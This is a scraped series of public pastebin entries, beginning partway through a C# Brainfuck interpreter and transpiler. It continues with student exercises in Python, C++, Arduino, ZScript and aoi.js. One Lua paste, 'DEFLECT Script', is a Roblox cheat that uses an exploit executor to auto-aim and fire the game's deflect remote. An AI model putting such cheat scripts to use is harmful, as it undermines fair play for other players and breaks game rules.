                        {
                            instructionPointer++;
                            if (code[instructionPointer] == '[')
                                loopDepth++;
                            else if (code[instructionPointer] == ']')
                                loopDepth--;
                        }
                    }
                    break;

                case ']':
                    if (memory[dataPointer] != 0)
                    {
                        int loopDepth = 1;
                        while (loopDepth > 0)
                        {
                            instructionPointer--;
                            if (code[instructionPointer] == ']')
                                loopDepth++;
                            else if (code[instructionPointer] == '[')
                                loopDepth--;
                        }
                    }
                    break;

                default:
                    // Ignore any non-Brainfuck characters.
                    break;
            }

            instructionPointer++;
        }
    }

    public string GetOutput()
    {
        return new string(outputBuffer.ToArray());
    }
}

public class Token
{
    public TokenType Type { get; }
    public string Value { get; }

    public Token(TokenType type, string value)
    {
        Type = type;
        Value = value;
    }
}

public enum TokenType
{
    Number,
    Add,
    Subtract,
    Multiply,
    Divide,
    Modulo,
    OpenParen,
    CloseParen,
    EOF
}

public class Lexer
{
    private readonly string input;
    private int position;

    public Lexer(string input)
    {
        this.input = input;
        position = 0;
    }

    private char CurrentChar => position < input.Length ? input[position] : '\0';

    private void MoveNext()
    {
        position++;
    }

    private void SkipWhitespace()
    {
        while (char.IsWhiteSpace(CurrentChar))
        {
            MoveNext();
        }
    }

    private bool IsDigit(char c)
    {
        return char.IsDigit(c);
    }

    private bool IsOperator(char c)
    {
        return c == '+' || c == '-' || c == '*' || c == '/' || c == '%';
    }

    public Token GetNextToken()
    {
        while (CurrentChar != '\0')
        {
            if (char.IsWhiteSpace(CurrentChar))
            {
                SkipWhitespace();
                continue;
            }

            if (IsDigit(CurrentChar))
            {
                string number = """";
                while (IsDigit(CurrentChar))
                {
                    number += CurrentChar;
                    MoveNext();
                }

                return new Token(TokenType.Number, number);
            }

            if (IsOperator(CurrentChar))
            {
                TokenType type;
                switch (CurrentChar)
                {
                    case '+': type = TokenType.Add; break;
                    case '-': type = TokenType.Subtract; break;
                    case '*': type = TokenType.Multiply; break;
                    case '/': type = TokenType.Divide; break;
                    case '%': type = TokenType.Modulo; break;
                    default: throw new Exception(""Invalid operator."");
                }
                string op = CurrentChar.ToString();
                MoveNext();
                return new Token(type, op);
            }

            if (CurrentChar == '(')
            {
                MoveNext();
                return new Token(TokenType.OpenParen, ""("");
            }

            if (CurrentChar == ')')
            {
                MoveNext();
                return new Token(TokenType.CloseParen, "")"");
            }

            throw new Exception(""Invalid character."");
        }

        return new Token(TokenType.EOF, """");
    }
}

public class ASTNode
{
    public TokenType Type { get; }
    public string Value { get; }
    public ASTNode Left { get; set; }
    public ASTNode Right { get; set; }

    public ASTNode(TokenType type, string value)
    {
        Type = type;
        Value = value;
        Left = null;
        Right = null;
    }
}

public class Parser
{
    private readonly Lexer lexer;
    private Token currentToken;

    public Parser(Lexer lexer)
    {
        this.lexer = lexer;
        currentToken = lexer.GetNextToken();
    }

    private void Eat(TokenType type)
    {
        if (currentToken.Type == type)
        {
            currentToken = lexer.GetNextToken();
        }
        else
        {
            throw new Exception($""Expected {type}, but got {currentToken.Type}."");
        }
    }

    private ASTNode Factor()
    {
        Token token = currentToken;
        if (token.Type == TokenType.Number)
        {
            Eat(TokenType.Number);
            return new ASTNode(TokenType.Number, token.Value);
        }
        else if (token.Type == TokenType.OpenParen)
        {
            Eat(TokenType.OpenParen);
            ASTNode node = Expr();
            Eat(TokenType.CloseParen);
            return node;
        }

        throw new Exception(""Invalid expression."");
    }

    private ASTNode Term()
    {
        ASTNode node = Factor();

        while (currentToken.Type == TokenType.Multiply || currentToken.Type == TokenType.Divide || currentToken.Type == TokenType.Modulo)
        {
            Token token = currentToken;
            if (token.Type == TokenType.Multiply)
            {
                Eat(TokenType.Multiply);
                node = new ASTNode(TokenType.Multiply, token.Value) { Left = node, Right = Factor() };
            }
            else if (token.Type == TokenType.Divide)
            {
                Eat(TokenType.Divide);
                node = new ASTNode(TokenType.Divide, token.Value) { Left = node, Right = Factor() };
            }
            else if (token.Type == TokenType.Modulo)
            {
                Eat(TokenType.Modulo);
                node = new ASTNode(TokenType.Modulo, token.Value) { Left = node, Right = Factor() };
            }
        }

        return node;
    }

    private ASTNode Expr()
    {
        ASTNode node = Term();

        while (currentToken.Type == TokenType.Add || currentToken.Type == TokenType.Subtract)
        {
            Token token = currentToken;
            if (token.Type == TokenType.Add)
            {
                Eat(TokenType.Add);
                node = new ASTNode(TokenType.Add, token.Value) { Left = node, Right = Term() };
            }
            else if (token.Type == TokenType.Subtract)
            {
                Eat(TokenType.Subtract);
                node = new ASTNode(TokenType.Subtract, token.Value) { Left = node, Right = Term() };
            }
        }

        return node;
    }

    public ASTNode Parse()
    {
        return Expr();
    }
}

public class BrainfuckTranspiler
{
    public static string Transpile(string input)
    {
        Lexer lexer = new Lexer(input);
        Parser parser = new Parser(lexer);
        ASTNode root = parser.Parse();
        return GenerateBrainfuckCode(root) + ""."";
    }

    private static string GenerateBrainfuckCode(ASTNode node)
    {
        if (node.Type == TokenType.Number)
        {
            int value = int.Parse(node.Value);
            return new string('+', value);
        }

        string leftCode = GenerateBrainfuckCode(node.Left);
        string rightCode = GenerateBrainfuckCode(node.Right);

        switch (node.Type)
        {
            case TokenType.Add:
                return leftCode + "">"" + rightCode + ""[-<+>]<"";
            case TokenType.Subtract:
                return leftCode + "">"" + rightCode + ""[-<->]<"";
            case TokenType.Multiply:
                return leftCode + "">"" + rightCode + ""<[>[->+>+<<]>[-<+>]<<-]>[-]>>[-<<<+>>>]<<<"";
            case TokenType.Divide:
                return leftCode + "">>>>"" + rightCode + ""<<<<[->+>>+>-[<-]<[<<[->>>+<<<]>>>>+<<-<]<<]>[-]>[-]>[-]>[-]>[-<<<<<+>>>>>]<<<<<"";
            case TokenType.Modulo:
                return leftCode + "">>>>"" + rightCode + ""<<<<[->+>>+>-[<-]<[<<[->>>+<<<]>>>>+<<-<]<<]>>[-]>[-]>[-]><<<<[-<+>]<"";
            default:
                throw new Exception(""Invalid node type."");
        }
    }
}"
EtNWPY11,Untitled,VladislavKovalskyi,Python,Saturday 22nd of July 2023 05:34:20 AM CDT,"import os
""""""
Завдання:
Вам потрібно написати програму, яка буде:
    • Додавати людину в БД
    • Видаляти людину з БД за її номером
    • Виводити список всіх людей в БД з їх номером
    • Редагувати інформацію про людину за її номером
    • Редагувати інформацію про людину за прізвищем
    • Виводити суму всіх балансів
    • Виводити людину, у якої найдовше прізвище

Вимоги:
    Словник має мати такі ключі: name, surname, balance
    Обов'язкове використання list, dict
""""""

users: list = []
number = 0

while True:
    print(
        ""Меню:\n""
        ""1. Додати людину\n""
        ""2. Видалити людину за номером\n""
        ""3. Вивести всіх людей\n""
        ""4. Редагувати інформацію про людину за номером \n""
        ""5. Редагувати інформацію про людину за прізвищем\n""
        ""6. Вивести мілліонера\n""
        ""7. Вивести людину з найдовшим прізвищем\n""
    )
    command = int(input(""Введіть номер команди: ""))
    os.system(""cls"")
    if command == 1:
        name = input(""Введіть ім'я: "")
        surname = input(""Введіть прізвище: "")
        balance = float(input(""Введіть баланс: ""))
        users.append({""name"": name, ""surname"": surname, ""balance"": balance})
        print(f""Ви успішно додали {len(users)}(-у) людину"")
        number += 1
    elif command == 2:
        num = int(input(""Введіть номер людини""))
        users.pop(num)
    elif command == 3:
        print(""Список всіх людей:"")
        for i, user in enumerate(users, 1):
            print(f""#{i} - Ім'я: {user['name']}\tПрізвище: {user['surname']}\tБаланс: {user['balance']}"")


    
    
    "
dL98gcUT,DEFLECT Script,A_GUES,Lua,Saturday 22nd of July 2023 05:19:55 AM CDT,"getgenv().Toggle = true
getgenv().BallDirection = Vector3.new(999999, 999999, 999999)

local plr = game.Players.LocalPlayer
local ball = nil

local function getBall()
    while true do 
        game:GetService(""RunService"").Stepped:Wait()
        if workspace:FindFirstChild(""Ball"") ~= nil then
            ball = workspace.Ball
            break
        end
    end
end

task.spawn(getBall)

while getgenv().Toggle do 
    game:GetService(""RunService"").Stepped:Wait()
    if (ball and ball:FindFirstChild(""Main"") and plr.Character ~= nil) then
        local distance = (ball.Main.Position - plr.Character.HumanoidRootPart.Position).Magnitude
        plr.Character.HumanoidRootPart.CFrame = CFrame.lookAt(plr.Character.HumanoidRootPart.Position, Vector3.new(ball.Main.Position.X, plr.Character.HumanoidRootPart.Position.Y, ball.Main.Position.Z))
        if (distance <= 17.8) then
            plr.Character:WaitForChild(""Deflection"").Remote:FireServer(""Deflect"", getgenv().BallDirection)
        end
    end
end
"
ui4ztHFy,Basic Shield System for ZScript,LadyFuzztail,C#,Saturday 22nd of July 2023 05:09:46 AM CDT,"class URPlayer : DoomPlayer
{
	int shieldMax;
	double shieldRechargeRate;
	int shieldRechargeDelay;
	int	armorBase;
	int armorMax;
	int nanitePool;
	property spMax : shieldMax;
	property spRate : shieldRechargeRate;
	property spDelay : shieldRechargeDelay;
	property apBase : armorBase;
	property apMax : armorMax;
	property npMax : nanitePool;
	
	Default
	{
		URPlayer.spMax 		25;
		URPlayer.spRate		15.;
		URPlayer.spDelay	140;
		URPlayer.apBase		10;
		URPlayer.apMax		200;
		URPlayer.npMax		200;
	}
}

class ProtoPossPawn : URPlayer
{
	Default
	{
		Health					75;
		Player.MaxHealth 		75;
		Player.DisplayName 		""Odysseus"";
		URPlayer.spMax 			50;
		URPlayer.spRate			25.;
		URPlayer.spDelay		140;
		URPlayer.apBase			15;
		URPlayer.apMax			150;
		URPlayer.npMax			150;
	}
}

class CommandoPawn : URPlayer
{
	Default
	{
		Health					100;
		Player.MaxHealth		100;
		Player.DisplayName		""Isabel"";
		URPlayer.spMax			25;
		URPlayer.spRate			15.;
		URPlayer.spDelay		140;
		URPlayer.apBase			20;
		URPlayer.apMax			200;
		URPlayer.npMax			100;
	}
}

class ShieldHandler : EventHandler
{
	override void WorldThingSpawned(WorldEvent e)
	{
		if (e.thing.player && !e.thing.FindInventory(""ShieldControl""))
			e.thing.GiveInventory(""ShieldControl"",1);
	}
}

class ShieldControl : Inventory
{
	int shieldRegenCD;
	double shieldRegenTics;
	URPlayer plr;
	
	Default
	{
		Inventory.MaxAmount		1;
		+Inventory.Undroppable
		+Inventory.Untossable
	}
	
	override void AttachToOwner(Actor other)
	{
		super.AttachToOwner(other);
		plr = URPlayer(owner);
		if (!owner)
			return;
		shieldRegenCD = 0;
		shieldRegenTics = 0.;
	}
	
	override void DoEffect()
	{
		super.DoEffect();
		if (!owner || owner.player.health <= 0)
			return;
		if (owner is ""URPlayer"")
		{
			ShieldRegen();
		}
	}
	
	void ShieldRegen()
	{
		if ( shieldRegenCD > 0 ) {
			--shieldRegenCD;
		} else {
			if (plr)
			{
				if (owner.CountInv(""ShieldPoints"") < plr.shieldMax) {
					shieldRegenTics += (plr.shieldRechargeRate * 0.01 * plr.shieldMax);
				} else {
					shieldRegenTics = 0.0;
				}
				while ( shieldRegenTics > 35.0 && owner.CountInv(""ShieldPoints"") < plr.shieldMax )
				{
					owner.GiveInventory(""ShieldPoints"",1);
					shieldRegenTics -= 35.0;
				}
			}
		}
	}
	
	override void ModifyDamage (int damage, Name damageType, out int newdamage, bool passive, Actor inflictor, Actor source, int flags)
	{
		int currSP;
		int blockedDamage;
		
		if (passive && damage > 0) {
			currSP = owner.CountInv(""ShieldPoints"");
			if (damage <= currSP) {
				blockedDamage = damage;
				newdamage = 0;
			} else {
				blockedDamage = currSP;
				newdamage = damage - currSP;
			}
			shieldRegenCD = plr.shieldRechargeDelay;
			owner.TakeInventory(""ShieldPoints"",blockedDamage);
		}
	}
}

class ShieldPoints : Inventory
{
	Default
	{
		Inventory.MaxAmount		9999;
		+Inventory.Undroppable
		+Inventory.Untossable
		+Inventory.KeepDepleted
	}
}"
zpida05Y,Untitled,LadyFuzztail,C#,Saturday 22nd of July 2023 04:36:48 AM CDT,"class URPlayer : DoomPlayer
{
	int shieldMax;
	double shieldRechargeRate;
	int shieldRechargeDelay;
	int	armorBase;
	int armorMax;
	int nanitePool;
	property spMax : shieldMax;
	property spRate : shieldRechargeRate;
	property spDelay : shieldRechargeDelay;
	property apBase : armorBase;
	property apMax : armorMax;
	property npMax : nanitePool;
	
	Default
	{
		URPlayer.spMax 		25;
		URPlayer.spRate		15.;
		URPlayer.spDelay	140;
		URPlayer.apBase		10;
		URPlayer.apMax		200;
		URPlayer.npMax		200;
	}
}

class ProtoPossPawn : URPlayer
{
	Default
	{
		Health					75;
		Player.MaxHealth 		75;
		Player.DisplayName 		""Odysseus"";
		URPlayer.spMax 			50;
		URPlayer.spRate			39.6825;
		URPlayer.spDelay		84;
		URPlayer.apBase			15;
		URPlayer.apMax			150;
		URPlayer.npMax			150;
	}
}

class CommandoPawn : URPlayer
{
	Default
	{
		Health					100;
		Player.MaxHealth		100;
		Player.DisplayName		""Isabel"";
		URPlayer.spMax			25;
		URPlayer.spRate			25.;
		URPlayer.spDelay		140;
		URPlayer.apBase			20;
		URPlayer.apMax			200;
		URPlayer.npMax			100;
	}
}

class ShieldHandler : EventHandler
{
	override void WorldThingSpawned(WorldEvent e)
	{
		if (e.thing.player && !e.thing.FindInventory(""ShieldControl""))
			e.thing.GiveInventory(""ShieldControl"",1);
	}
	
	override void WorldThingDamaged(WorldEvent e)
	{
		if (!e.thing.FindInventory(""ShieldControl""))
			return;
		
		let shield = ShieldControl(e.thing.FindInventory(""ShieldControl""));
		if (!shield)
			return;
		URPlayer plr = URPlayer(e.thing);
		if (!plr)
			return;
		shield.shieldRegenCD = plr.shieldRechargeDelay;
	}
}

class ShieldControl : Inventory
{
	int shieldRegenCD;
	double shieldRegenTics;
	
	Default
	{
		Inventory.MaxAmount		1;
		+Inventory.Undroppable
		+Inventory.Untossable
	}
	
	override void AttachToOwner(Actor other)
	{
		super.AttachToOwner(other);
		if (!owner)
			return;
		shieldRegenCD = 0;
		shieldRegenTics = 0.;
	}
	
	override void DoEffect()
	{
		super.DoEffect();
		if (!owner || owner.player.health <= 0)
			return;
		if (owner is ""URPlayer"")
		{
			ShieldRegen();
		}
	}
	
	void ShieldRegen()
	{
		if ( shieldRegenCD > 0 ) {
			--shieldRegenCD;
		} else {
			URPlayer plr = URPlayer(owner);
			if (plr)
			{
				shieldRegenTics += (plr.shieldRechargeRate * 0.01 * plr.shieldMax);
				while ( shieldRegenTics > 35.0 && owner.CountInv(""ShieldPoints"") < plr.shieldMax )
				{
					owner.GiveInventory(""ShieldPoints"",1);
					shieldRegenTics -= 35.0;
				}
			}
		}
	}
	
	override void ModifyDamage (int damage, Name damageType, out int newdamage, bool passive, Actor inflictor, Actor source, int flags)
	{
		int currSP;
		int blockedDamage;
		
		if (passive && damage > 0) {
			currSP = CountInv(""ShieldPoints"");
			if (damage <= currSP) {
				blockedDamage = damage;
				newdamage = 0;
				TakeInventory(""ShieldPoints"",blockedDamage);
			} else {
				blockedDamage = currSP;
				newdamage = damage - currSP;
				TakeInventory(""ShieldPoints"",blockedDamage);
			}
		}
	}
}

class ShieldPoints : Inventory
{
	Default
	{
		Inventory.MaxAmount		9999;
		+Inventory.Undroppable
		+Inventory.Untossable
		+Inventory.KeepDepleted
	}
}"
gggr0X4X,Untitled,Josif_tepe,C++,Saturday 22nd of July 2023 04:27:59 AM CDT,"#include <iostream>
#include <algorithm>
#include <cstring>
#include <vector>
#include <set>
using namespace std;

/*
 da se napise programa koja ke gi sobere cifrite na eden broj
 rekurzivno
 **/
int dp[1005];
int fib(int n) {
    if(n <= 2) {
        return 1;
    }
    if(dp[n] != -1) {
        return dp[n];
    }
    return dp[n] = fib(n - 1) + fib(n - 2);
}
int main() {
    ios::sync_with_stdio(false);
    memset(dp, -1, sizeof dp);
    cout << fib(5) << endl;
    return 0;
}
// fib(5) = fib(4) + [fib(3)] = 3 + 2 = 5
// fib(4) = fib(3) + fib(2) = 2 + 1 = 3
// fib(3) = fib(2) + fib(1) = 2
// fib(2) = 1
// fib(1) = 1
// fib(2) = 1
// fib(3) = 2
"
LJ2PJhrv,Untitled,35657,C++,Saturday 22nd of July 2023 04:22:52 AM CDT,"#include <iostream>
using namespace std;

int power(int a, int n) {
    if (n == 0) {
        return 1;
    }
    return a * power(a, n - 1);
}

int main() {
    setlocale(LC_ALL, ""ru"");
    int a, n;
    cout << ""Введите число: "";
    cin >> a;
    cout << ""Введите степень: "";
    cin >> n;
    cout << power(a, n);
}"
xQk2kFT9,Untitled,Josif_tepe,C++,Saturday 22nd of July 2023 03:56:41 AM CDT,"#include <iostream>
#include <algorithm>
#include <cstring>
#include <vector>
#include <set>
using namespace std;
using namespace std;

const long long mod=1e9+7;

int main() {
    ios::sync_with_stdio(false);
    int n, k;
    cin >> n >> k;
    vector<pair<int, int>> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i].second >> v[i].first;
    }
    
    sort(v.begin(), v.end());
    
    multiset<int> ms;
    
    for(int i = 0; i < k; i++) {
        ms.insert(0);
    }
    int result = 0;
    for(int i = 0; i < n; i++) {
        int S = v[i].second;
        int E = v[i].first;
        multiset<int>::iterator it = ms.upper_bound(S);
        if(it != ms.begin()) {
            it--;
            ms.erase(it);
            ms.insert(E + 1);
            result++;
        }
        
    }
    cout << result << endl;
  
    return 0;
}
"
BEuLgBap,get_data_ultrasonic.ino,basyair7,Arduino,Saturday 22nd of July 2023 03:22:19 AM CDT,"// buat fungsi program untuk sensor ultrasonic 
 long sensorUltrasonic() { 
   // proses pemancaran suara ultrasonic 
   digitalWrite(pinTrig, LOW); 
   delayMicroseconds(80); 
   digitalWrite(pinTrig, LOW); 
   digitalWrite(pinTrig, HIGH); 
   delayMicroseconds(80); 
   delayMicroseconds(80); 
  
   // proses penerimaan suara ultrasonic 
   long durasi = pulseIn(pinEcho, HIGH); 
   long jarak = (durasi / 2) / 2.91; // mengubah durasi menjadi panjang jarak (cm) 
  
   return jarak; 
 }"
C88nPcdn,Struc Data to and from EEPROM,Rhavecilla,C++,Saturday 22nd of July 2023 02:42:20 AM CDT,"/*  PROGRAM ID: 5-ChannelsPowerControl.ino
 *  PROGRAMMER: Rolando Avecilla 
 *  DATE      : 
 *  DONE      : 
 *  OBJECTIVE : 
 *  TARGET    : Teensy 3.6
 *  NOTE      : 
 *
 */


//===============================================================//
// Load libraries.                                               //
//===============================================================//
#include <EEPROM.h>


//===============================================================//
// Global variables and constant.                                //
//===============================================================//

// Define struct
struct structData {
  int intVar;
  float floatVar;
  bool boolVar;
};

void setup() {
  Serial.begin(115200);
  
  // Define and then initialize struct instance.
  structData forSAving;
  forSAving.intVar = 42;
  forSAving.floatVar = 3.14;
  forSAving.boolVar = true;

  // Save the struct to EEPROM.
  saveToEEPROM(forSAving);

  delay(3000);

  // Retrieve the struct from EEPROM.
  structData forRetrieving;
  retrieveFromEEPROM(forRetrieving);  

  Serial.println(forRetrieving.intVar);
  Serial.println(forRetrieving.floatVar);
  Serial.println(forRetrieving.boolVar);

  Serial.println(""Setup ends."");
}

void loop() {
  // do nothing.
}

// Function to store data in EEPROM.
void saveToEEPROM(const structData& data) {
  // Calculate the starting EEPROM address for your data.
  int address = 0;

  // Write the data to EEPROM byte by byte.
  byte* pData = (byte*)&data;
  for (unsigned int i = 0; i < sizeof(data); i++) {
    EEPROM.write(address + i, pData[i]);
    delay(100);
  }
}

// Function to retrieve the struct from EEPROM.
void retrieveFromEEPROM(structData& data) {
  // Calculate the starting EEPROM address for your data.
  int address = 0;

  // Read the data from EEPROM byte by byte.
  byte* pData = (byte*)&data;
  for (unsigned int i = 0; i < sizeof(data); i++) {
    pData[i] = EEPROM.read(address + i);
  }
}

"
USCE4kR0,Untitled,35657,C++,Saturday 22nd of July 2023 02:31:28 AM CDT,"#include <iostream>

using namespace std;

int Fact(int N) {
    if (N < 1) { // факториал это произведение натуральных чисел от 1 до N (если N < 1 возвращаем 0)
        return 0;
    }
    else if (N == 1) {  // условие выхода из рекурсии, обязательно!
        return 1;
    }
    else {
        return N * Fact(N - 1); //функция вызывает саму себя, но с меньшим параметром
    }
}


//N!= 1 * 2 * 3 * ... * N

//N!= N * (N - 1)!

//1!= 1;



int main() {
    setlocale(LC_ALL, ""ru"");

    cout << Fact(3) << endl;
}
"
7cwJYBmx,How to make a balance command in aoi.js,Dreamer_1314,JavaScript,Saturday 22nd of July 2023 02:24:06 AM CDT,"Variables Required :
Coins = 25000
Bank = 0

For non command handler user :
bot.command({
  name: ""balance"",
  aliases: [
    ""bal"",
    ""Balance"",
    ""Bal""
  ],
  code: `
  $title[$username's Balance]
  $description[$getGlobalUserVar[Coins;$authorID] Coins
$getGlobalUserVar[Bank;$authorID] Bank]
  $color[00ff6c]
  $footer[Requested By $userTag[$authorID]]
  $addTimestamp
  `
)}

for command handler users :
module.exports = ({
  name: ""balance"",
  aliases: [
    ""bal"",
    ""Balance"",
    ""Bal""
  ],
  code: `
  $title[$username's Balance]
  $description[$getGlobalUserVar[Dream Coins;$authorID] Dream Coins
$getGlobalUserVar[Bank;$authorID] Bank]
  $color[00ff6c]
  $footer[Requested By $userTag[$authorID]]
  $addTimestamp
  `
)}"
5XYdqy3U,Untitled,35657,C++,Saturday 22nd of July 2023 02:10:34 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
void bubble_sort(T array[], int size) {
    for (int k = 0; k < size; k++) {
        for (int j = 0; j < size - 1; j++) {
            if (array[j] > array[j + 1]) {
                T temp = array[j];
                array[j] = array[j + 1];
                array[j + 1] = temp;
            }
        }
    }
}


template <typename T>
void display(T array[], int size) {
    for (int i = 0; i < size; i++) {
        cout << array[i] << "" "";
    }
    cout << endl;
}


int main() {
    setlocale(LC_ALL, ""ru"");

    int array[]{ 1, 3, 7, -4, -2, 4 };
    int size = 6;
    cout << ""Original int Array : "";
    display(array, size);
    bubble_sort(array, size);
    cout << ""Sorted   int Array : "";
    display(array, size);


    double doublearray[]{ 3.5, 2.5, 3.7, 1.0, 3.3 };
    size = 5;
    cout << ""Original double Array : "";
    display(doublearray, size);
    bubble_sort(doublearray, size);
    cout << ""Sorted double Array : "";
    display(doublearray, size);
}
"
jHC6NHCf,ski trip,fingli,Python,Saturday 22nd of July 2023 02:08:24 AM CDT,"days = int(input())
pom = input()
eval = input()

nights = days - 1
room_for_one = 18
apartment = 25
president_apartment = 35

if days < 10:
    if pom == ""apartment"":
        apartment = apartment - (apartment * 0.30)
    elif pom == ""president apartment"":
        president_apartment = president_apartment - (president_apartment * 0.10)
elif 10 <= days <= 15:
    if pom == ""apartment"":
        apartment = apartment - (apartment * 0.35)
    elif pom == ""president apartment"":
        president_apartment = president_apartment - (president_apartment * 0.15)
elif days > 15:
    if pom == ""apartment"":
        apartment = apartment - (apartment * 0.50)
    elif pom == ""president apartment"":
        president_apartment = president_apartment - (president_apartment * 0.20)

if eval == ""positive"":
    room_for_one = room_for_one + (room_for_one * 0.25)
    apartment = apartment + (apartment * 0.25)
    president_apartment = president_apartment + (president_apartment * 0.25)
elif eval == ""negative"":
    room_for_one = room_for_one - (room_for_one * 0.10)
    apartment = apartment - (apartment * 0.10)
    president_apartment = president_apartment - (president_apartment * 0.10)

if pom == ""room for one person"":
    print(f""{nights * room_for_one:.2f}"")
elif pom == ""apartment"":
    print(f""{nights * apartment:.2f}"")
elif pom == ""president apartment"":
    print(f""{nights * president_apartment:.2f}"")
"
fZHfUc9V,Untitled,35657,C++,Saturday 22nd of July 2023 01:22:58 AM CDT,"#include <string>
#include <iostream>

using namespace std;


// Человек
class Person {
public:

    Person(string name, string gender, int age) : name_(name), gender_(gender), age_(age) {}

    void SetName(string name) {
        name_ = name;
    }

    void SetGender(string gender) {
        gender_ = gender;
    }

    void SetAge(int age) {
        age_ = age;
    }

    string GetName() const {
        return name_;
    }
    int GetAge() const {
        return age_;
    }
    string GetGender() const {
        return gender_;
    }

    virtual void Speak() {
        cout << ""Привет!"" << endl;
    }

    string name_;
    string gender_;
    int age_;
};


class Wolf {

public:

    Wolf(int weight, int height, string colour) : weight_(weight), height_(height), colour_(colour) {}

    void SetWeight(int weight) {
        weight_ = weight;
    }

    int GetWeight() {
        return weight_;
    }

    void SetHeight(int height) {
        height_ = height;
    }

    int GetHeight() {
        return height_;
    }

    void SetColour(string colour) {
        colour_ = colour;
    }

    string GetColour() {
        return colour_;
    }

private:
    int weight_;
    int height_;
    string colour_;
};


class Warewolf : public Person, public Wolf {
public:

    Warewolf(string name, string gender, int age, int weight, int height, string colour) : Person(name, gender, age), Wolf(weight, height, colour) {}

    void Speak() override {
        cout << ""У-у-у-у-у-у!"" << endl;
    }
};


int main() {
    setlocale(LC_ALL, ""ru"");

    Warewolf wf(""John"", ""man"", 20, 100, 50, ""Gray"");

    wf.SetName(""John"");
    wf.SetColour(""Gray"");
    cout << wf.GetName() << "" "" << wf.GetColour() << endl;
    wf.Speak();
}"
WGW2fMUH,邀您一起看：封神第一部,xiaomianao666,JavaScript,Saturday 22nd of July 2023 01:04:34 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥封神第一部@@
